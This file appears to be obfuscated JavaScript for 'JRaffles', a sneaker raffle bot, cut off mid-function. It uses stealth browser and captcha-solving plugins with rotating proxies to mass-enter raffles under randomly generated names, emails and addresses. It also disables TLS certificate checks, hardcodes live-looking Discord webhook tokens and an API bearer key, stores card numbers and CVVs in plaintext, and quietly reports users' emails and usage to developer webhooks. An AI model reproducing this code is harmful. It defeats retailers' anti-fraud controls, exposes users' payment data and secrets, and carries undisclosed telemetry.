process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x343ecd = require('fs'), _0x4afd1b = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x2554d9(_0x332382) {
    const _0x5bdc8a = _0x343ecd['createWriteStream'](_0x332382, { 'flags': 'a' }), _0xe23def = console['log'];
    console['log'] = function () {
        const _0x579d7c = Array['prototype']['slice']['call'](arguments), _0x23d5cc = _0x579d7c['join']('\x20') + '\x0a';
        _0x5bdc8a['write'](_0x23d5cc), _0xe23def['apply'](console, _0x579d7c);
    };
}
_0x2554d9('../logs/log\x20' + _0x4afd1b);
var _0x19c532 = require('tough-cookie'), _0x5a0913 = require('node-imap'), _0x32004b = require('util')['inspect'];
const _0x57117f = require('mailparser')['simpleParser'], { EmbedBuilder: _0x5313a1 } = require('discord.js');
var _0x593051 = require('exe');
const { execFile: _0x4f4c69 } = require('child_process'), _0x154b82 = require('puppeteer-extra'), _0x3cd441 = require('puppeteer-extra-plugin-recaptcha'), _0x4918ac = require('puppeteer-extra-plugin-stealth'), _0x3f1ec6 = require('chalk'), _0x5c2a2f = require('node-bash-title'), _0x5ad0b1 = require('axios'), _0x54b359 = require('papaparse');
var _0x2b6940 = require('random-name');
const _0x954c28 = require('request');
var _0x1c1d23 = require('prompt');
const _0x30822e = _0x954c28['jar']();
var _0x343742 = {};
const _0x3ed856 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x10d32d = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x2e3434 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0xe755f2 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x126f1d = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1fb36b = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x44a927 = 'https://discord.com/api/webhooks/', _0x6f4bcd = '' + _0x44a927 + _0x2e3434, _0x435bee = '' + _0x44a927 + _0xe755f2, _0x84cdc1 = '' + _0x44a927 + _0x3ed856, _0x1dfefb = '' + _0x44a927 + _0x10d32d, _0x510dd4 = '' + _0x44a927 + _0x126f1d, _0x534cc3 = '' + _0x44a927 + _0x1fb36b;
const _0xceb1a8 = JSON['parse'](_0x343ecd['readFileSync']('../package.json', 'utf-8')), _0x3c97e2 = _0xceb1a8['version'];
var _0x17496a, _0x8ffb32, _0x4539ae, _0x2450e6, _0x237ae3, _0x3ba935, _0x1b66d2, _0x28688a;
const _0x2aaa26 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x809b0c = ![];
const _0x221f6c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x223ecd = '0123456789';
var _0x355032 = _0x221f6c['split']('');
const _0x6e7037 = require('auto-git-update'), _0x36bbfd = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x5694b5 = new _0x6e7037(_0x36bbfd);
async function _0x4207b6() {
    _0x237ae3 = _0x343ecd['readdirSync']('../proxies'), _0x2450e6 = _0x343ecd['readdirSync']('../tasks'), !_0x343ecd['existsSync']('../accounts/fenom.csv') && _0x343ecd['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x343ecd['existsSync']('../accounts/paypal.csv') && _0x343ecd['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x343ecd['existsSync']('../accounts/bstn.csv') && _0x343ecd['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x343ecd['existsSync']('../accounts/eql.csv') && _0x343ecd['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x343ecd['existsSync']('../failed-tasks.csv') && _0x343ecd['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x343ecd['existsSync']('../successful-tasks.csv') && _0x343ecd['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x343742 = JSON['parse'](_0x343ecd['readFileSync']('../settings.json', 'utf-8')), !_0x343742['delay'] && (_0x343742['delay'] = 0x3c, _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), !_0x343742['threads'] && (_0x343742['threads'] = 0x1, _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), !_0x343742['masterMail'] && (_0x343742['masterMail'] = 'yourmail@gmail.com', _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), !_0x343742['masterPassword'] && (_0x343742['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), !_0x343742['captchaKey'] && (_0x343742['captchaKey'] = '', _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), !_0x343742['useRandomProxy'] && (_0x343742['useRandomProxy'] = !![], _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), !_0x343742['shuffleTasks'] && (_0x343742['shuffleTasks'] = ![], _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), !_0x343742['webhook'] && (_0x343742['webhook'] = '', _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), _0x343742['delay'] <= 0x1388 && (_0x343742['delay'] = _0x343742['delay'] * 0x3e8), _0x343742['AfewDelay'] && (delete _0x343742['AfewDelay'], _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), _0x343742['MahaDelay'] && (delete _0x343742['MahaDelay'], _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), _0x343742['footshopDelay'] && (delete _0x343742['footshopDelay'], _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742, null, 0x2))), _0x343742['MahaDelay'] = _0x343742['delay'], _0x44a927 = _0x343742['webhook'], _0x3ba935 = _0x343742['licenseKey'];
}
let _0x5b6c59, _0xd130f2 = [], _0x43177a;
const _0x4aaa24 = _0x3436fa => new Promise(_0x49485b => setTimeout(_0x49485b, _0x3436fa));
function _0x5030a0(_0x2d1b71, _0x1da993) {
    return Math['floor'](Math['random']() * (_0x1da993 - _0x2d1b71 + 0x1) + _0x2d1b71);
}
function _0x240d04(_0x3b2b44) {
    let _0xa12ff9 = _0x3b2b44['length'], _0x2d2bcb;
    while (_0xa12ff9 != 0x0) {
        _0x2d2bcb = Math['floor'](Math['random']() * _0xa12ff9), _0xa12ff9--, [_0x3b2b44[_0xa12ff9], _0x3b2b44[_0x2d2bcb]] = [
            _0x3b2b44[_0x2d2bcb],
            _0x3b2b44[_0xa12ff9]
        ];
    }
    return _0x3b2b44;
}
async function _0x1bbe25(_0x13246c) {
    return _0x5ad0b1['get']('https://api.hyper.co/v4/licenses/' + _0x13246c, { 'headers': { 'Authorization': 'Bearer\x20' + _0x2aaa26 } })['then'](_0xcef077 => _0xcef077['data'])['catch'](() => null);
}
;
async function _0x5a0ab6(_0x2f8960) {
    console['clear']();
    if (_0x2f8960 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x134a81 = await _0x1c1d23['get']('License');
        if (_0x134a81['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x4aaa24(0xbb8), _0x5a0ab6(_0x2f8960);
        _0x2f8960 = _0x134a81['License'], _0x343742['licenseKey'] = _0x2f8960, _0x3ba935 = _0x2f8960, _0x343ecd['writeFileSync']('../settings.json', JSON['stringify'](_0x343742));
    }
    console['log']('Checking\x20license\x20' + _0x3ba935 + '...'), await _0x4aaa24(0x320);
    const _0x13f70c = await _0x1bbe25(_0x2f8960);
    _0x1b66d2 = JSON['stringify'](_0x13f70c['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x28688a = JSON['stringify'](_0x13f70c['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x13f70c)
        return console['log']('License\x20not\x20found');
    if (!_0x13f70c['user'])
        return console['log']('License\x20not\x20bound');
    return _0x13f70c['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x809b0c = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x809b0c = ![]);
}
async function _0x2b0c3e() {
    var _0x3c9e6c = await _0x1c1d23['get']('Module');
    return console['clear'](), _0x3c9e6c['Module'];
}
;
async function _0x1676f8() {
    var _0xbf5db7 = await _0x1c1d23['get']('Setting');
    return console['clear'](), _0xbf5db7['Setting'];
}
async function _0x49f119(_0x369bc9) {
    var _0x31cb23 = [];
    for (file of _0x2450e6) {
        var _0x3b5509 = _0x343ecd['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x54b359['parse'](_0x3b5509, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x369bc9['store'] && _0x31cb23['push'](file);
    }
    !_0x31cb23['length'] == 0x0 && (_0x2450e6 = _0x31cb23);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x1aeef2 = 0x0; _0x1aeef2 < _0x2450e6['length']; _0x1aeef2++) {
        console['log']('\x20(' + _0x1aeef2 + ')\x20' + _0x2450e6[_0x1aeef2]);
    }
    console['log']('');
    var _0x10eb05 = await _0x1c1d23['get']('Task');
    if (_0x10eb05['Task'] > _0x2450e6['length'] - 0x1 || isNaN(_0x10eb05['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4aaa24(0x3e8), _0x49f119();
    var _0x1589ae = _0x343ecd['readFileSync']('../tasks/' + _0x2450e6[_0x10eb05['Task']], 'utf-8');
    return _0x4539ae = _0x54b359['parse'](_0x1589ae, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x3f1ec6['blue'](_0x2450e6[_0x10eb05['Task']])), _0x17496a = _0x2450e6[_0x10eb05['Task']], _0x4539ae;
}
async function _0x325811() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x25daa5 = 0x0; _0x25daa5 < _0x237ae3['length']; _0x25daa5++) {
        console['log']('\x20(' + _0x25daa5 + ')\x20' + _0x237ae3[_0x25daa5]);
    }
    console['log']('');
    var _0x31a4a1 = await _0x1c1d23['get']('Proxies');
    if (_0x31a4a1['Proxies'] > _0x237ae3['length'] - 0x1 || isNaN(_0x31a4a1['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4aaa24(0x3e8), _0x325811();
    var _0x6343d6 = _0x343ecd['readFileSync']('../proxies/' + _0x237ae3[_0x31a4a1['Proxies']], 'utf-8')['split']('\x0a');
    let _0x101749 = _0x6343d6['map']((_0x975e26, _0x33e596) => {
        sanatizeProxy = _0x975e26['replace']('\x0d', '');
        if (_0x6343d6[_0x33e596 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x8ffb32 = _0x237ae3[_0x31a4a1['Proxies']], console['clear'](), _0x101749;
}
async function _0x303958() {
    var _0xbd4518 = await _0x1c1d23['get']('Value');
    return console['clear'](), _0xbd4518['Value'];
}
async function _0x467016(_0x1e5089) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x5854d5 = 0x0; _0x5854d5 < _0x1e5089['length']; _0x5854d5++) {
        console['log']('\x20(' + _0x5854d5 + ')\x20[' + _0x1e5089[_0x5854d5]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x1a902e = await _0x1c1d23['get']('Module');
    return _0x1a902e['Module'];
}
async function _0x1139bb() {
    var _0x458859 = await _0x1c1d23['get']('Password');
    return console['clear'](), _0x458859['Password'];
}
;
async function _0x2be4e9() {
    var _0x20f96c = await _0x1c1d23['get']('Links');
    return _0x20f96c['Links'];
}
;
async function _0x5e9adc() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x449e04 = 0x0; _0x449e04 < _0xd130f2['length']; _0x449e04++) {
        console['log']('\x20(' + _0x449e04 + ')\x20' + _0xd130f2[_0x449e04]);
    }
    ;
    console['log']();
    let _0x203f34 = await _0x1c1d23['get']('Product');
    return console['clear'](), _0x203f34['Product'];
}
;
function _0x15e32e() {
    var _0x434dae = new Date(Date['now']())['toLocaleTimeString']();
    return _0x434dae;
}
;
function _0x28b86f() {
    var _0x504bbf = new Date(Date['now']())['toLocaleString']();
    return _0x504bbf['replace'](',', '');
}
async function _0x3c4b04(_0x4e0af8, _0x4e6c25) {
    let _0x1355d7 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x3c97e2 != 'devkey') {
        await _0x5ad0b1['post'](_0x4e0af8, _0x4e6c25, _0x1355d7);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0xe75614(_0x528024, _0x1e6522, _0x1a033e, _0x1b3a7f, _0x14ba35) {
    if (!_0x1b3a7f && _0x1a033e == 'dev') {
        var _0x4e579e = new _0x5313a1()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x1e6522['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x1e6522['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x528024['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x343742['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x1b66d2,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x528024['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x528024['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x3c97e2,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4e579e['data'];
    } else {
        if (_0x1b3a7f && _0x1a033e == 'dev') {
            var _0x4e579e = new _0x5313a1()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x1e6522['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x1b66d2,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x1e6522['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x528024['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x343742['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x14ba35,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x528024['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x528024['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x3c97e2,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4e579e['data'];
        } else {
            if (_0x1a033e == 'pub') {
                var _0x4e579e = new _0x5313a1()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x1e6522['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x1e6522['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x528024['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x343742['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x528024['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x3c97e2,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4e579e['data'];
            } else {
                if (_0x1a033e == 'acc' && !_0x1b3a7f) {
                    var _0x4e579e = new _0x5313a1()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x1e6522['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x1b66d2,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x1e6522['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x343742['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x3c97e2,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4e579e['data'];
                } else {
                    if (_0x1a033e == 'acc' && _0x1b3a7f) {
                        var _0x4e579e = new _0x5313a1()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x1e6522['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x1b66d2,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x14ba35,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x1e6522['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x343742['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x3c97e2,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4e579e['data'];
                    } else {
                        if (_0x1a033e == 'open') {
                            var _0x4e579e = new _0x5313a1()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x28688a)['addFields']({
                                'name': 'User',
                                'value': '' + _0x1b66d2,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x3c97e2,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4e579e['data'];
                        } else {
                            if (!_0x1b3a7f && _0x1a033e == 'ver') {
                                var _0x4e579e = new _0x5313a1()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x1e6522['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x1b66d2,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x1e6522['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x343742['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x3c97e2,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4e579e['data'];
                            } else {
                                if (_0x1b3a7f && _0x1a033e == 'ver') {
                                    var _0x4e579e = new _0x5313a1()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x1e6522['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x1b66d2,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x14ba35,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x1e6522['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x343742['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x3c97e2,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4e579e['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x10409e(_0x28cc01, _0x54e488) {
    var _0xfde866 = _0x28cc01[_0x54e488]['Address1']['split'](''), _0x17c9a5 = _0x28cc01[_0x54e488]['Address2']['split'](''), _0xc0681 = _0x28cc01[_0x54e488]['Email']['split']('@');
    for (var _0x1317ad = 0x0; _0x1317ad < _0xfde866['length']; _0x1317ad++) {
        if (_0xfde866[_0x1317ad] == 'X') {
            var _0x30b5db = Math['round'](Math['random']() * (_0x221f6c['length'] - 0x1));
            _0xfde866[_0x1317ad] = _0x355032[_0x30b5db];
        }
    }
    ;
    for (var _0x1317ad = 0x0; _0x1317ad < _0x17c9a5['length']; _0x1317ad++) {
        if (_0x17c9a5[_0x1317ad] == 'X') {
            var _0x30b5db = Math['round'](Math['random']() * (_0x221f6c['length'] - 0x1));
            _0x17c9a5[_0x1317ad] = _0x355032[_0x30b5db];
        }
    }
    ;
    _0x28cc01[_0x54e488]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x28cc01[_0x54e488]['FirstName'] = _0x2b6940['first']());
    _0x28cc01[_0x54e488]['LastName']['toUpperCase']() == 'RANDOM' && (_0x28cc01[_0x54e488]['LastName'] = _0x2b6940['last']());
    _0xc0681[0x0]['toUpperCase']() == 'RANDOM' ? _0xc0681[0x0] = '' + _0x2b6940['first']() + _0x2b6940['last']() + _0x5030a0(0x1, 0x3e7) + '@' : _0xc0681[0x0] = _0xc0681[0x0] + '@';
    _0x28cc01[_0x54e488]['Email'] = _0xc0681['join'](''), _0x28cc01[_0x54e488]['Address1'] = _0xfde866['join'](''), _0x28cc01[_0x54e488]['Address2'] = _0x17c9a5['join']('');
    _0x28cc01[_0x54e488]['Phone'] == 'RANDOM' && (_0x28cc01[_0x54e488]['Phone'] = '0' + _0x5030a0(0x5f5e100, 0x3b9ac9ff));
    if (_0x28cc01[_0x54e488]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x501ed3 = _0x5030a0(0x1, 0x270f);
        _0x28cc01[_0x54e488]['Follower'] = '' + _0x2b6940['first']() + _0x2b6940['last']() + _0x501ed3 + '\x20';
    }
    _0x28cc01[_0x54e488]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x28cc01[_0x54e488]['HouseNumber'] = _0x5030a0(0x1, 0xc8));
    if (_0x28cc01[_0x54e488]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x4619b6 = Math['round'](Math['random']() * (_0x221f6c['length'] - 0x1)), _0x44b040 = _0x355032[_0x4619b6];
        _0x28cc01[_0x54e488]['Address1'] = _0x2b6940['last']() + 'straat', _0x28cc01[_0x54e488]['Zip'] == '' && (_0x28cc01[_0x54e488]['Postcode'] = _0x5030a0(0x3e8, 0x270f) + '\x20' + _0x44b040 + _0x44b040, _0x28cc01[_0x54e488]['Zip'] = _0x28cc01[_0x54e488]['Postcode']), _0x28cc01[_0x54e488]['HouseNumber'] = '' + _0x5030a0(0x1, 0xc8);
    }
    return;
}
;
async function _0x5d0cd0(_0x4e625b, _0x4c261b) {
    _0x343ecd['appendFileSync']('../failed-tasks.csv', _0x28b86f() + ',' + _0x4c261b['store'] + ',' + _0x4c261b['name'] + ',' + _0x4e625b['Url'] + ',' + _0x4e625b['Size'] + ',' + _0x4e625b['Follower'] + ',' + _0x4e625b['FirstName'] + ',' + _0x4e625b['LastName'] + ',' + _0x4e625b['Address1'] + ',' + _0x4e625b['Address2'] + ',' + _0x4e625b['HouseNumber'] + ',' + _0x4e625b['Zip'] + ',' + _0x4e625b['City'] + ',' + _0x4e625b['State'] + ',' + _0x4e625b['Country'] + ',' + _0x4e625b['Phone'] + ',' + _0x4e625b['Email'] + ',' + _0x4e625b['Password'] + ',' + _0x4e625b['PaymentMethod'] + ',' + _0x4e625b['CardType'] + ',' + _0x4e625b['NameOnCard'] + ',' + _0x4e625b['CardNumber'] + ',' + _0x4e625b['ExpiryDate'] + ',' + _0x4e625b['CVV'] + ',' + _0x4e625b['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x3265a5(_0x29186f, _0x1b769d) {
    _0x343ecd['appendFileSync']('../successful-tasks.csv', _0x28b86f() + ',' + _0x1b769d['store'] + ',' + _0x1b769d['name'] + ',' + _0x29186f['Url'] + ',' + _0x29186f['Size'] + ',' + _0x29186f['Follower'] + ',' + _0x29186f['FirstName'] + ',' + _0x29186f['LastName'] + ',' + _0x29186f['Address1'] + ',' + _0x29186f['Address2'] + ',' + _0x29186f['HouseNumber'] + ',' + _0x29186f['Zip'] + ',' + _0x29186f['City'] + ',' + _0x29186f['State'] + ',' + _0x29186f['Country'] + ',' + _0x29186f['Phone'] + ',' + _0x29186f['Email'] + ',' + _0x29186f['Password'] + ',' + _0x29186f['PaymentMethod'] + ',' + _0x29186f['CardType'] + ',' + _0x29186f['NameOnCard'] + ',' + _0x29186f['CardNumber'] + ',' + _0x29186f['ExpiryDate'] + ',' + _0x29186f['CVV'] + ',' + _0x29186f['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x3d72a8() {
    let _0xa6c3be = proxyFile['split']('\x0a'), _0x4a94ae = _0xa6c3be['map']((_0x1fc70c, _0x5e0f7c) => {
        sanatizeProxy = _0x1fc70c['replace']('\x0d', '');
        if (_0xa6c3be[_0x5e0f7c + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4a94ae;
}
;
async function _0x48914c(_0x3e5d4c, _0x86180e) {
    if (_0x4abdb3 != 'yes')
        var _0x4abdb3 = '', _0x434e2c = 0x0;
    async function _0x83f22b() {
        var _0x21121a = _0x343ecd['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x5e616a = _0x54b359['parse'](_0x21121a, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0xd16af9 = 0x0; _0xd16af9 < _0x5e616a['length']; _0xd16af9++) {
            console['log']('(' + _0xd16af9 + ')\x20' + _0x5e616a[_0xd16af9]['Email']);
        }
        console['log']('\x0a(' + _0x5e616a['length'] + ')\x20' + _0x3f1ec6['cyan']('Add\x20a\x20new\x20account'));
        let _0xb59a3e = await _0x1c1d23['get']('Option');
        if (_0xb59a3e['Option'] < _0x5e616a['length'])
            return _0x5e616a[_0xb59a3e['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x132f13 = {}, _0x3b4282 = await _0x1c1d23['get']('Email');
        _0x132f13['Email'] = _0x3b4282['Email'];
        var _0x52d4db = Math['round'](Math['random']() * (_0x86180e['length'] - 0x1));
        _0x132f13['Proxy'] = _0x86180e[_0x52d4db], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x33dd83 = await _0x1c1d23['get']('Password');
